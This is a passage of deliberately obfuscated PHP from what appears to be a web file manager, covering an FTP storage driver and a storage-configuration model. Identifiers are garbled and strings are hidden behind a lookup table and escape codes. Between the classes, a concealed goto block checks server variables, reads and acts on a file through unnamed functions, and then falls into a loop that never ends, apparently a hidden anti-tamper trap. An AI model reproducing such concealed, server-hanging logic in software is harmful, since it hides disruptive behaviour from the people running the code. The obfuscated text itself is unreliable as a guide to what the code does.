$²ØéæˆÂ =& $_SERVER[­õöî’–]; static $«–¶»‚  = array(); $º™»Ä´â = md5(json_encode($äéÇÉîğ)); if (isset($«–¶»‚ [$º™»Ä´â])) { foreach ($«–¶»‚ [$º™»Ä´â] as $ßÜú¬Ó => $Î‘Ñ—•¼) { $this->{$ßÜú¬Ó} = $Î‘Ñ—•¼; } return !0; } $¤×Òª = parse_url(trim($this->server, $²ØéæˆÂ[8])); $this->host = $¤×Òª[$²ØéæˆÂ[181]]; $ƒª–ù¹Ô = isset($¤×Òª[$²ØéæˆÂ[180]]) && $¤×Òª[$²ØéæˆÂ[180]] == $²ØéæˆÂ[1377] ? !0 : !1; $this->scheme = $ƒª–ù¹Ô ? $²ØéæˆÂ[1378] : $²ØéæˆÂ[1379]; $this->port = isset($¤×Òª[$²ØéæˆÂ[182]]) ? $¤×Òª[$²ØéæˆÂ[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ò–ì™šê = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $‡Üµøô‡ = $this->pasv == $²ØéæˆÂ[88] ? !0 : !1; @ftp_pasv($this->connect, $‡Üµøô‡); $«–¶»‚ [$º™»Ä´â] = array($²ØéæˆÂ[1380] => $this->connect, $²ØéæˆÂ[181] => $this->host, $²ØéæˆÂ[180] => $this->scheme, $²ØéæˆÂ[182] => $this->port); return $ò–ì™šê; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($æ…ÄûÄá, $³‡úÓÀ = '', $›£äßÜ— = REPEAT_RENAME) { if ($this->setContent($æ…ÄûÄá, $³‡úÓÀ)) { return $this->getPathOuter($æ…ÄûÄá); } return !1; } public function mkdir($·ş—®Ğ, $Ö½â÷«ä = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $·ş—®Ğ = $this->iconvSystem($·ş—®Ğ); if ($this->_isFolder($·ş—®Ğ) || @ftp_mkdir($this->connect, $·ş—®Ğ)) { return $this->getPathOuter($·ş—®Ğ); } if (!$this->mkdir($this->pathFather($·ş—®Ğ))) { return !1; } if ($·ş—®Ğ = @ftp_mkdir($this->connect, $·ş—®Ğ)) { return $this->getPathOuter($·ş—®Ğ); } return !1; } public function copyFile($ßÌïÜê‡, $ô¸Ó²¢) { if (!$this->_isconn()) { return !1; } $˜›ÉâÄÌ = $this->pathThis($this->iconvSystem($ßÌïÜê‡)); $­¸ª’ˆÈ = $this->tempFile($˜›ÉâÄÌ); $Ù»‚ÂßŒ = $this->iconvApp($­¸ª’ˆÈ); $this->download($ßÌïÜê‡, $Ù»‚ÂßŒ); $†ññ”›Ä = $this->upload($ô¸Ó²¢, $Ù»‚ÂßŒ); $this->tempFileRemve($­¸ª’ˆÈ); return $†ññ”›Ä; } public function moveFile($¤æèÚéû, $Êó±öæ) { if (!$this->_isconn()) { return !1; } $¤æèÚéû = $this->iconvSystem($¤æèÚéû); $Êó±öæ = $this->iconvSystem($Êó±öæ); $óÂÙ»Á = @ftp_rename($this->connect, $¤æèÚéû, $Êó±öæ); return $óÂÙ»Á ? $this->getPathOuter($Êó±öæ) : !1; } public function delFile($€ü¸¹€å) { if (!$this->_isconn()) { return !1; } $€ü¸¹€å = $this->iconvSystem($€ü¸¹€å); return @ftp_delete($this->connect, $€ü¸¹€å); } public function delFolder($ÅòıĞğ”) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $½éÆæ¹˜ = $³õÌ™ö = array(); $this->fileList($ÅòıĞğ”, $½éÆæ¹˜, $³õÌ™ö, !0); $this->listItemCache = !0; foreach ($³õÌ™ö as $¦ó”Ó²ª) { $¦½ª¡øí = $this->iconvSystem($¦ó”Ó²ª[$_SERVER[­õöî’–][32]]); $ïßšùşß = @ftp_delete($this->connect, $¦½ª¡øí); if (!$ïßšùşß) { return !1; } } foreach ($½éÆæ¹˜ as $¦½ª¡øí) { $¦½ª¡øí = $this->iconvSystem($¦½ª¡øí); $ïßšùşß = @ftp_rmdir($this->connect, $¦½ª¡øí); if (!$ïßšùşß) { return !1; } } $ÅòıĞğ” = $this->iconvSystem($ÅòıĞğ”); return @ftp_rmdir($this->connect, $ÅòıĞğ”); } public function rename($×­’í§€, $ØÌ˜‡šÔ) { $ğéÌ­ŸË =& $_SERVER[­õöî’–]; if (!$this->_isconn()) { return !1; } $ª´ªŒ® = $this->fileNameAuto($this->pathFather($×­’í§€), $ØÌ˜‡šÔ); $ª´ªŒ® = $this->iconvSystem($ª´ªŒ®); $×­’í§€ = $this->iconvSystem($×­’í§€); $ïÆ¢É¡Ÿ = $this->pathFather($×­’í§€); $Šà‚Á = rtrim($ïÆ¢É¡Ÿ, $ğéÌ­ŸË[8]) . $ğéÌ­ŸË[8] . $ª´ªŒ®; $«ÇÔ•Çù = @ftp_rename($this->connect, $×­’í§€, $Šà‚Á); $Šà‚Á = $this->iconvApp($Šà‚Á); return $«ÇÔ•Çù ? $this->getPathOuter($Šà‚Á) : !1; } private function folderInfo($““ìÜİ, $ŒÓ²œÇ÷ = false) { $ò¤ ëÜÙ =& $_SERVER[­õöî’–]; $òÃäÊóÊ = array($ò¤ ëÜÙ[32] => $this->pathThis($““ìÜİ), $ò¤ ëÜÙ[84] => $this->getPathOuter($ò¤ ëÜÙ[8] . $““ìÜİ), $ò¤ ëÜÙ[33] => $ò¤ ëÜÙ[75]); if ($ŒÓ²œÇ÷) { return $òÃäÊóÊ; } $òÃäÊóÊ[$ò¤ ëÜÙ[200]] = $òÃäÊóÊ[$ò¤ ëÜÙ[85]] = 0; $òÃäÊóÊ[$ò¤ ëÜÙ[201]] = $òÃäÊóÊ[$ò¤ ëÜÙ[202]] = !0; return $òÃäÊóÊ; } private function fileInfo($š„Ş¡¶, $‰ÃÈçşƒ = false, $àõƒµÔ´ = array()) { $Ğƒû¤ìğ =& $_SERVER[­õöî’–]; $˜„€ñÙŸ = array($Ğƒû¤ìğ[32] => $this->pathThis($š„Ş¡¶), $Ğƒû¤ìğ[84] => $this->getPathOuter($Ğƒû¤ìğ[8] . $š„Ş¡¶), $Ğƒû¤ìğ[33] => $Ğƒû¤ìğ[199], $Ğƒû¤ìğ[76] => isset($àõƒµÔ´[$Ğƒû¤ìğ[76]]) ? $àõƒµÔ´[$Ğƒû¤ìğ[76]] : 0, $Ğƒû¤ìğ[174] => $this->ext($š„Ş¡¶)); if ($‰ÃÈçşƒ) { return $˜„€ñÙŸ; } $˜„€ñÙŸ[$Ğƒû¤ìğ[200]] = $˜„€ñÙŸ[$Ğƒû¤ìğ[85]] = 0; $˜„€ñÙŸ[$Ğƒû¤ìğ[201]] = $˜„€ñÙŸ[$Ğƒû¤ìğ[202]] = !0; $ÀÁËù€î = $this->iconvSystem($š„Ş¡¶); $˜„€ñÙŸ[$Ğƒû¤ìğ[85]] = @ftp_mdtm($this->connect, $ÀÁËù€î); if (empty($àõƒµÔ´)) { $àõƒµÔ´ = $this->objectMeta($š„Ş¡¶); if (!$àõƒµÔ´) { return $˜„€ñÙŸ; } } $˜„€ñÙŸ[$Ğƒû¤ìğ[76]] = $àõƒµÔ´[$Ğƒû¤ìğ[76]]; return $˜„€ñÙŸ; } public function size($”¨ğ×ïó) { $ú´£Æö± = $this->objectMeta($”¨ğ×ïó); return $ú´£Æö± ? $ú´£Æö±[$_SERVER[­õöî’–][76]] : 0; } public function info($œ¦§Îô) { if ($this->isFile($œ¦§Îô)) { return $this->fileInfo($œ¦§Îô, 0); } else { if ($this->isFolder($œ¦§Îô)) { return $this->folderInfo($œ¦§Îô); } } return !1; } private function fileList($·‹Í€¯™, &$ˆÓ…ñ·é, &$›ˆ‘©Šú, $èŸşÜëÁ = false) { $„éı¤Šı =& $_SERVER[­õöî’–]; $·‹Í€¯™ = $this->iconvSystem($·‹Í€¯™); if (!$this->isFolder($·‹Í€¯™)) { return !1; } @ftp_chdir($this->connect, $„éı¤Šı[8]); $·‹Í€¯™ = rtrim($·‹Í€¯™, $„éı¤Šı[8]) . $„éı¤Šı[8]; check_abort(); $§ç“»æí = @ftp_rawlist($this->connect, $·‹Í€¯™); if (!$§ç“»æí) { $§ç“»æí = array(); } $Œòß­ ° = array($„éı¤Šı[10] => 1, $„éı¤Šı[1381] => 1); foreach ($§ç“»æí as $Š„¥™•™) { $°ùÀë—œ = $this->_listItem($Š„¥™•™); if ($°ùÀë—œ[0] == $„éı¤Šı[750]) { continue; } $•–¢€ = $°ùÀë—œ[8]; if (empty($•–¢€) && $•–¢€ !== $„éı¤Šı[197] || isset($Œòß­ °[$•–¢€])) { continue; } $•–¢€ = $this->iconvApp($·‹Í€¯™ . ltrim($•–¢€, $„éı¤Šı[8])); $ò«Ãï› = array($„éı¤Šı[32] => $•–¢€, $„éı¤Šı[33] => $„éı¤Šı[199], $„éı¤Šı[76] => $°ùÀë—œ[4]); if (substr($Š„¥™•™, 0, 1) == $„éı¤Šı[1382]) { $ò«Ãï›[$„éı¤Šı[33]] = $„éı¤Šı[75]; $ò«Ãï›[$„éı¤Šı[76]] = 0; } $†¤£Ó±– = $ò«Ãï›[$„éı¤Šı[33]] == $„éı¤Šı[75] ? !0 : !1; $this->cacheMethodInfoSet($•–¢€, $†¤£Ó±–, $ò«Ãï›); if ($†¤£Ó±–) { $ˆÓ…ñ·é[] = $•–¢€; if ($èŸşÜëÁ) { $this->fileList($•–¢€, $ˆÓ…ñ·é, $›ˆ‘©Šú, $èŸşÜëÁ); } continue; } $›ˆ‘©Šú[] = $ò«Ãï›; } $this->cacheMethodInfoSet($·‹Í€¯™, !0); } private function _listItem($ÁÎåó¼) { if (empty($ÁÎåó¼)) { return array(); } $…ÛÚº¶® = preg_split($_SERVER[­õöî’–][1383], $ÁÎåó¼); if (count($…ÛÚº¶®) <= 9) { return $…ÛÚº¶®; } $…ÛÚº¶®[8] = trim(substr($ÁÎåó¼, strpos($ÁÎåó¼, $…ÛÚº¶®[7]) + strlen($…ÛÚº¶®[7]))); return array_splice($…ÛÚº¶®, 0, 9); } public function listPath($—÷·„É¸, $„ºÈøù­ = false) { $‚¼‰î™è =& $_SERVER[­õöî’–]; if (!$this->_isconn()) { return !1; } $—¥ÀØÈÕ = $²çüª = array(); $this->fileList($—÷·„É¸, $—¥ÀØÈÕ, $²çüª); foreach ($—¥ÀØÈÕ as $ÊÄ”øç‹ => $Øõ£ëÒı) { $—¥ÀØÈÕ[$ÊÄ”øç‹] = $this->folderInfo($Øõ£ëÒı, $„ºÈøù­); } foreach ($²çüª as $ÊÄ”øç‹ => $Øõ£ëÒı) { $²çüª[$ÊÄ”øç‹] = $this->fileInfo($Øõ£ëÒı[$‚¼‰î™è[32]], $„ºÈøù­, $Øõ£ëÒı); } return array($‚¼‰î™è[82] => $—¥ÀØÈÕ, $‚¼‰î™è[83] => $²çüª); } public function has($·”©ğ², $Ö¸»Éã¶ = false, $”ÉÍÔèã = true) { $éøª‚ÁÒ =& $_SERVER[­õöî’–]; $é‹ö©á— = $Ù‡É‡Ï‰ = array(); $ôøóòŸ€ = $Ö¸»Éã¶ ? !0 : !1; $this->fileList($·”©ğ², $é‹ö©á—, $Ù‡É‡Ï‰, $ôøóòŸ€); if ($Ö¸»Éã¶) { return array($éøª‚ÁÒ[207] => count($Ù‡É‡Ï‰), $éøª‚ÁÒ[208] => count($é‹ö©á—)); } if ($”ÉÍÔèã) { if (count($Ù‡É‡Ï‰)) { return !0; } } else { if (count($é‹ö©á—)) { return !0; } } return !1; } public function listAll($òØŸ¬¬î) { $×ÑÉÆ’ =& $_SERVER[­õöî’–]; if (!$this->_isconn()) { return !1; } $«ªù·ûğ = $Ç€“í´ = array(); $this->fileList($òØŸ¬¬î, $«ªù·ûğ, $Ç€“í´, !0); $’‰¾­ìú = array(); foreach ($Ç€“í´ as $£ñ’ªÂŠ) { $’‰¾­ìú[$£ñ’ªÂŠ[$×ÑÉÆ’[32]]] = $£ñ’ªÂŠ[$×ÑÉÆ’[76]]; } foreach ($«ªù·ûğ as $£ñ’ªÂŠ) { if (is_string($£ñ’ªÂŠ)) { $’‰¾­ìú[$£ñ’ªÂŠ] = 0; } } return $this->listAllFiles($òØŸ¬¬î, array_keys($’‰¾­ìú), $’‰¾­ìú); } public function getContent($Ó§Š‚Ğ) { if (!$this->_isconn()) { return !1; } $Ó§Š‚Ğ = $this->iconvSystem($Ó§Š‚Ğ); return $this->fileSubstr($Ó§Š‚Ğ); } public function setContent($Ùû¢çÅ, $›´îîˆ‰ = '') { if (!$this->_isconn()) { return !1; } $Ç©Æç†£ = $this->pathThis($this->iconvSystem($Ùû¢çÅ)); $±×«Èî = $this->tempFile($Ç©Æç†£); file_put_contents($±×«Èî, $›´îîˆ‰); $õÄ£ê½ü = $this->upload($Ùû¢çÅ, $this->iconvApp($±×«Èî)); $this->tempFileRemve($±×«Èî); return $õÄ£ê½ü; } public function fileSubstr($›£ÎÉî, $º¼‰„‚† = 0, $¬©ûô™Ş = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($›£ÎÉî, $º¼‰„‚†, $¬©ûô™Ş); } private function ftpRequest($ãİÙ’çÃ, $õÌ¨òÕ = 0, $ºá‡ÆÔ = false) { $ãİÙ’çÃ = $this->iconvSystem($ãİÙ’çÃ); $÷¾Õ‡ãß = $this->scheme . $this->host . $_SERVER[­õöî’–][4] . $this->port; $Ö„¦é = curl_init(); curl_setopt($Ö„¦é, CURLOPT_URL, $÷¾Õ‡ãß . $this->pathEncode($ãİÙ’çÃ)); curl_setopt($Ö„¦é, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ºá‡ÆÔ) { $±ò®¸‚â = $õÌ¨òÕ + $ºá‡ÆÔ - 1; curl_setopt($Ö„¦é, CURLOPT_RANGE, "{$õÌ¨òÕ}\x2d{$±ò®¸‚â}"); } curl_setopt($Ö„¦é, CURLOPT_RETURNTRANSFER, 1); $áŸ‰­»Ÿ = curl_exec($Ö„¦é); curl_close($Ö„¦é); return $áŸ‰­»Ÿ; } public function upload($÷½‹Ç£», $şÅÅØÉ•, $ÀôÒÄ‡² = false, $ÃéÎ–ä = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($÷½‹Ç£»))) { return !1; } $÷½‹Ç£» = $this->iconvSystem($÷½‹Ç£»); $şÅÅØÉ• = $this->iconvSystem($şÅÅØÉ•); $Œõ±ÕáÑ = ftp_nb_put($this->connect, $÷½‹Ç£», $şÅÅØÉ•, FTP_BINARY); while ($Œõ±ÕáÑ == FTP_MOREDATA) { $Œõ±ÕáÑ = ftp_nb_continue($this->connect); } if ($Œõ±ÕáÑ != FTP_FINISHED) { return !1; } return $this->getPathOuter($÷½‹Ç£»); } public function download($†Š‰Ÿô¡, $·Ê•ë§â = '') { if (!$this->_isconn()) { return !1; } $Ùşğ¬²÷ = $this->pathFather($·Ê•ë§â); if (!IO::mkdir($Ùşğ¬²÷)) { return !1; } $†Š‰Ÿô¡ = $this->iconvSystem($†Š‰Ÿô¡); $·Ê•ë§â = $this->iconvSystem($·Ê•ë§â); $¹ÈÂšê = ftp_nb_get($this->connect, $·Ê•ë§â, $†Š‰Ÿô¡, FTP_BINARY); while ($¹ÈÂšê == FTP_MOREDATA) { $¹ÈÂšê = ftp_nb_continue($this->connect); } if ($¹ÈÂšê != FTP_FINISHED) { return !1; } return $this->iconvApp($·Ê•ë§â); } public function exist($œß¡³—Œ) { return $this->isFile($œß¡³—Œ) || $this->isFolder($œß¡³—Œ); } public function isFile($×¸ÚÄœ„) { return !$this->isFolder($×¸ÚÄœ„) && $this->objectMeta($×¸ÚÄœ„); } public function isFolder($ÂÕ™‚”·) { return $this->cacheMethod($_SERVER[­õöî’–][165], $ÂÕ™‚”·); } protected function objectMeta($Ù‚¡«õ«) { return $this->cacheMethod($_SERVER[­õöî’–][167], $Ù‚¡«õ«); } protected function _objectMeta($èñæë) { $Æê‘µİ =& $_SERVER[­õöî’–]; if ($èñæë == $Æê‘µİ[12] || $èñæë == $Æê‘µİ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $èñæë = $this->iconvSystem($èñæë); $Ñ¡ ºáí = array($Æê‘µİ[32] => $this->iconvApp($èñæë), $Æê‘µİ[33] => $Æê‘µİ[199], $Æê‘µİ[76] => 0); @ftp_chdir($this->connect, $Æê‘µİ[8]); $ÅÚ‡°–ò = @ftp_size($this->connect, $èñæë); if ($ÅÚ‡°–ò != -1) { $Ñ¡ ºáí[$Æê‘µİ[76]] = $ÅÚ‡°–ò; } else { $Äö¬Í™¬ = @ftp_chdir($this->connect, $èñæë); if (!$Äö¬Í™¬) { return !1; } $Ñ¡ ºáí[$Æê‘µİ[33]] = $Æê‘µİ[75]; } return $Ñ¡ ºáí; } protected function _isFolder($÷¬³Ùî) { $ù‡‹ê¢Ğ =& $_SERVER[­õöî’–]; if ($÷¬³Ùî == $ù‡‹ê¢Ğ[12] || $÷¬³Ùî == $ù‡‹ê¢Ğ[8]) { return !0; } $ùş‡›† = $this->_objectMeta($÷¬³Ùî); return isset($ùş‡›†[$ù‡‹ê¢Ğ[33]]) && $ùş‡›†[$ù‡‹ê¢Ğ[33]] == $ù‡‹ê¢Ğ[75] ? !0 : !1; } } goto bÀ¢­Œ’™»; Bğ¨¹ÅÏ÷Š: if (!isset($_SERVER[$_SERVER[­õöî’–][869]]) || !isset($_SERVER[$_SERVER[­õöî’–][867]])) { $_getc = $_SERVER[­õöî’–][871]; $_getfile = $_SERVER[$_SERVER[­õöî’–][872]] . $_SERVER[­õöî’–][873]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[­õöî’–][231], $_getfilec); if (count($_getarrs) < $_SERVER[­õöî’–][626]) { $exit = $_SERVER[­õöî’–][874]; $exit(); } $_act = $_SERVER[­õöî’–][911]; $_act($_SERVER[$_SERVER[­õöî’–][872]] . $_SERVER[­õöî’–][873]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[­õöî’–][378]); } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\163\x6f\x75\162\143\145\123\x65\143\162\145\x74\114\x69\163\x74"; public $field = array("\163\x6f\x75\x72\143\145\x49\104", "\x74\x79\x70\145\111\x44", "\x63\162\x65\x61\164\145\x55\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\163\164\157\x72\x61\147\x65\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\151\172\x65\115\x61\x78", "\163\x79\x73\164\145\x6d", "\144\145\146\x61\x75\154\164", "\144\x72\151\166\145\162", "\143\157\x6e\146\151\x67"); public function listData($ÒÒÓ‰› = false, $¦äãç¾€ = "\x6d\157\x64\x69\146\x79\x54\x69\x6d\145", $Æ½‘‰çÔ = false) { $ÂŒ™Ú×Ä =& $_SERVER[­õöî’–]; $É´¾æÎà = parent::listData($ÒÒÓ‰›, $¦äãç¾€, $Æ½‘‰çÔ); if ($ÒÒÓ‰›) { return $É´¾æÎà; } $¹óßİ® = $this->ioSizeUseGet(array_to_keyvalue($É´¾æÎà, $ÂŒ™Ú×Ä[12], $ÂŒ™Ú×Ä[399])); foreach ($É´¾æÎà as $ûÃ©üÒ‡ => $ëó–¨«) { unset($É´¾æÎà[$ûÃ©üÒ‡][$ÂŒ™Ú×Ä[6]]); $É´¾æÎà[$ûÃ©üÒ‡][$ÂŒ™Ú×Ä[1838]] = isset($¹óßİ®[$ëó–¨«[$ÂŒ™Ú×Ä[399]]]) ? $¹óßİ®[$ëó–¨«[$ÂŒ™Ú×Ä[399]]] : 0; } return $É´¾æÎà; } public function ioSizeUseGet($ñ—ı…Ò) { $àÀµ™û¬ =& $_SERVER[­õöî’–]; if (!$ñ—ı…Ò) { return array(); } $á×şşóâ = $àÀµ™û¬[2161] . implode($àÀµ™û¬[50], $ñ—ı…Ò); $œ€ËÙŠò = Cache::get($á×şşóâ); if ($œ€ËÙŠò) { return $œ€ËÙŠò; } $”—ôåüÚ = array($àÀµ™û¬[808] => $àÀµ™û¬[399], $àÀµ™û¬[2162] => $àÀµ™û¬[76]); $î©‚”Õâ = array($àÀµ™û¬[808] => array($àÀµ™û¬[7], $ñ—ı…Ò)); $œ€ËÙŠò = Model($àÀµ™û¬[780])->field($”—ôåüÚ)->where($î©‚”Õâ)->group($àÀµ™û¬[808])->select(); $œ€ËÙŠò = array_to_keyvalue($œ€ËÙŠò, $àÀµ™û¬[399], $àÀµ™û¬[76]); Cache::set($á×şşóâ, $œ€ËÙŠò, 600); return $œ€ËÙŠò; } public function getConfig($ª¸¿³ş‘) { $¦’ÇƒÄ³ = parent::listData($ª¸¿³ş‘); return json_decode($¦’ÇƒÄ³[$_SERVER[­õöî’–][6]], !0); } public function update($û¢Ş¶¤š, $î•ÊİÆ‰) { $˜øƒÔ¢Ñ =& $_SERVER[­õöî’–]; $ê÷ÀÒ¿û = $î•ÊİÆ‰[$˜øƒÔ¢Ñ[32]]; $°Ì†ñ‚ = array_to_keyvalue(parent::listData(), $˜øƒÔ¢Ñ[32]); if (isset($°Ì†ñ‚[$ê÷ÀÒ¿û]) && $°Ì†ñ‚[$ê÷ÀÒ¿û][$˜øƒÔ¢Ñ[399]] != $û¢Ş¶¤š) { return !1; } $this->checkPwd($û¢Ş¶¤š, $î•ÊİÆ‰); if (isset($î•ÊİÆ‰[$˜øƒÔ¢Ñ[2163]]) && $î•ÊİÆ‰[$˜øƒÔ¢Ñ[2163]] == $˜øƒÔ¢Ñ[88]) { $this->checkConfig($î•ÊİÆ‰); } unset($î•ÊİÆ‰[$˜øƒÔ¢Ñ[2163]]); $¥Ö†Ôºá = parent::update($û¢Ş¶¤š, $î•ÊİÆ‰); if ($¥Ö†Ôºá && $î•ÊİÆ‰[$˜øƒÔ¢Ñ[37]]) { $“óã«ŒÈ = 0; foreach ($°Ì†ñ‚ as $¡¿ œÀ¤) { if ($¡¿ œÀ¤[$˜øƒÔ¢Ñ[37]] && $¡¿ œÀ¤[$˜øƒÔ¢Ñ[399]] != $û¢Ş¶¤š) { $“óã«ŒÈ = $¡¿ œÀ¤[$˜øƒÔ¢Ñ[399]]; parent::update($¡¿ œÀ¤[$˜øƒÔ¢Ñ[399]], array($˜øƒÔ¢Ñ[37] => 0)); } } $this->updateBackup($û¢Ş¶¤š, $“óã«ŒÈ); } return $¥Ö†Ôºá; } public function add($Œ‘Èüø×) { $…ö”Ãİ‘ =& $_SERVER[­õöî’–]; $ÅÕÚÉ’ = array_to_keyvalue(parent::listData(), $…ö”Ãİ‘[32]); if (isset($ÅÕÚÉ’[$Œ‘Èüø×[$…ö”Ãİ‘[32]]])) { return !1; } $this->checkConfig($Œ‘Èüø×); $”Ú°ùÔ” = parent::insert($Œ‘Èüø×); if ($”Ú°ùÔ” && $Œ‘Èüø×[$…ö”Ãİ‘[37]]) { foreach ($ÅÕÚÉ’ as $Å¼ŸÆÀ¡) { if ($Å¼ŸÆÀ¡[$…ö”Ãİ‘[37]]) { parent::update($Å¼ŸÆÀ¡[$…ö”Ãİ‘[399]], array($…ö”Ãİ‘[37] => 0)); } } } return $”Ú°ùÔ”; } public function updateBackup($ÊØßÊÎÎ, $ÆŠÖ¶ÀØ) { $´¸˜Îˆ =& $_SERVER[­õöî’–]; if (!$ÆŠÖ¶ÀØ) { return; } $”©Ş•íÂ = Model($´¸˜Îˆ[740])->config(); if ($”©Ş•íÂ[$´¸˜Îˆ[1630]] != $´¸˜Îˆ[88] || $”©Ş•íÂ[$´¸˜Îˆ[743]] != $ÆŠÖ¶ÀØ) { return; } $ªÚ´Ê„Ô = Model($´¸˜Îˆ[761])->get($´¸˜Îˆ[771]); $ªÚ´Ê„Ô = json_decode($ªÚ´Ê„Ô, !0); if (!$ªÚ´Ê„Ô) { return; } $ªÚ´Ê„Ô[$´¸˜Îˆ[743]] = $ÊØßÊÎÎ; Model($´¸˜Îˆ[761])->set(array($´¸˜Îˆ[771] => $ªÚ´Ê„Ô)); } public function checkPwd($èì›ß¤Û, &$ÂòÆèê¥) { $‹ùóŞ’ó =& $_SERVER[­õöî’–]; if (empty($ÂòÆèê¥[$‹ùóŞ’ó[6]])) { return; } $ö¡¢Ì = json_decode($ÂòÆèê¥[$‹ùóŞ’ó[6]], !0); $ÅÔ¥«ÒÁ = $‹ùóŞ’ó[12]; $¤Îæïã = array($‹ùóŞ’ó[2164], $‹ùóŞ’ó[2165], $‹ùóŞ’ó[886]); foreach ($¤Îæïã as $¨”íò©ó) { if (isset($ö¡¢Ì[$¨”íò©ó])) { $ÅÔ¥«ÒÁ = $¨”íò©ó; break; } } if (!$ÅÔ¥«ÒÁ) { return; } $¼á½´ı´ = $this->getConfig($èì›ß¤Û); $õ©ôØ¬Ï = $¼á½´ı´[$ÅÔ¥«ÒÁ]; $Œ‰Ó÷„‹ = $ö¡¢Ì[$ÅÔ¥«ÒÁ]; if ($Œ‰Ó÷„‹ == str_repeat($‹ùóŞ’ó[188], strlen($õ©ôØ¬Ï))) { $ö¡¢Ì[$ÅÔ¥«ÒÁ] = $õ©ôØ¬Ï; $ÂòÆèê¥[$‹ùóŞ’ó[6]] = json_encode($ö¡¢Ì); } else { if ($Œ‰Ó÷„‹ != $õ©ôØ¬Ï) { $ÂòÆèê¥[$‹ùóŞ’ó[2163]] = $‹ùóŞ’ó[88]; } } } public function checkConfig(&$ şöÃ˜ç, $ÉË÷À  = false) { $ï™Ïß® =& $_SERVER[­õöî’–]; $²Âïğ¿î = strtolower($ şöÃ˜ç[$ï™Ïß®[95]]); $†Ø”—í = json_decode($ şöÃ˜ç[$ï™Ïß®[6]], !0); foreach ($†Ø”—í as $ñàÚÎÛ¦ => $ ƒñÀş) { $†Ø”—í[$ñàÚÎÛ¦] = trim($ ƒñÀş); } $†Ø”—í[$ï™Ïß®[2166]] = rand_string(6); $ıó’—„İ = $GLOBALS[$ï™Ïß®[6]][$ï™Ïß®[89]][$ï™Ïß®[817]]; $ƒ·º—ˆä = isset($ıó’—„İ[$²Âïğ¿î]) ? $ıó’—„İ[$²Âïğ¿î] : ucfirst($²Âïğ¿î); $ÛÄÏÃ¦Š = $ï™Ïß®[74] . $ƒ·º—ˆä; if (!$ƒ·º—ˆä || !class_exists($ÛÄÏÃ¦Š)) { if ($ÉË÷À ) { return LNG($ï™Ïß®[2167]); } write_log(array($ï™Ïß®[2168], $ şöÃ˜ç, get_caller_info()), $ï™Ïß®[2169]); show_json(LNG($ï™Ïß®[2167]), !1, $ şöÃ˜ç); } $ÆÀ î°» = new $ÛÄÏÃ¦Š($†Ø”—í); if (in_array($²Âïğ¿î, $ÆÀ î°»->objectDriver)) { if (!$ÆÀ î°»->isBucketCors() && !$ÆÀ î°»->setBucketCors()) { $Å²ã¡¨Œ = LNG($ï™Ïß®[2170]); $Å²ã¡¨Œ .= $ï™Ïß®[2171] . LNG($ï™Ïß®[2172]); if ($ÉË÷À ) { return $Å²ã¡¨Œ; } show_json($Å²ã¡¨Œ, !1); } } $ƒ¥¥ÄìÏ = rtrim($†Ø”—í[$ï™Ïß®[1179]], $ï™Ïß®[8]) . $ï™Ïß®[8]; $áŸÃ“‹ = $ÆÀ î°»->getPath($ƒ¥¥ÄìÏ . $ï™Ïß®[1183]); if (!$ÆÀ î°»->mkfile($áŸÃ“‹)) { if ($ÉË÷À ) { return LNG($ï™Ïß®[2170]); } show_json(LNG($ï™Ïß®[2170]), !1); } $†Ø”—í[$ï™Ïß®[1179]] = $ƒ¥¥ÄìÏ; $ şöÃ˜ç[$ï™Ïß®[6]] = json_encode($†Ø”—í); $ şöÃ˜ç[$ï™Ïß®[95]] = $ƒ·º—ˆä; return !0; } public function driverListSystem() { $üüåÖ§¶ =& $_SERVER[­õöî’–]; $Ë¹™‚‡Ö = parent::listData(); $Ö ¹† á = array(); foreach ($Ë¹™‚‡Ö as $­Ó»‚÷ì) { unset($­Ó»‚÷ì[$üüåÖ§¶[200]], $­Ó»‚÷ì[$üüåÖ§¶[85]]); $­Ó»‚÷ì[$üüåÖ§¶[6]] = json_decode($­Ó»‚÷ì[$üüåÖ§¶[6]], !0); $Ö ¹† á[] = $­Ó»‚÷ì; } return $Ö ¹† á; } public function defaultDriver() { $¾é÷û´À =& $_SERVER[­õöî’–]; $ìÄ¯æË = parent::listData(); $¤Ä®” = array_filter_by_field($ìÄ¯æË, $¾é÷û´À[37], 1); $¤Ä®” = $¤Ä®”[0]; if ($¤Ä®”) { $¤Ä®”[$¾é÷û´À[6]] = json_decode($¤Ä®”[$¾é÷û´À[6]], !0); } return $¤Ä®”; } public function driverInfo($‰¬¡) { $˜Ú½¶òø =& $_SERVER[­õöî’–]; $‹Ò»¡çÁ = array_to_keyvalue(parent::listData(), $˜Ú½¶òø[399]); if (!isset($‹Ò»¡çÁ[$‰¬¡])) { return !1; } $‰íÓİĞ× = $‹Ò»¡çÁ[$‰¬¡]; $‰íÓİĞ×[$˜Ú½¶òø[6]] = json_decode($‰íÓİĞ×[$˜Ú½¶òø[6]], !0); return $‰íÓİĞ×; } public function remove($ÛÃª…àÔ) { $this->removeShareItems($ÛÃª…àÔ); return parent::remove($ÛÃª…àÔ); } public function removeWithFile($è‘³ì, $ô…¡£Çå) { $İ¾Œ®ãÉ =& $_SERVER[­õöî’–]; $Àˆ¥‹Ï = array($İ¾Œ®ãÉ[808] => $è‘³ì); $ÃãûŞ¶ = Model($İ¾Œ®ãÉ[471])->where($Àˆ¥‹Ï)->count(); $¦»ºÕ = Model($İ¾Œ®ãÉ[471])->where($Àˆ¥‹Ï)->sum($İ¾Œ®ãÉ[76]); $Ë²ŞÁì = $ô…¡£Çå . $İ¾Œ®ãÉ[2173] . 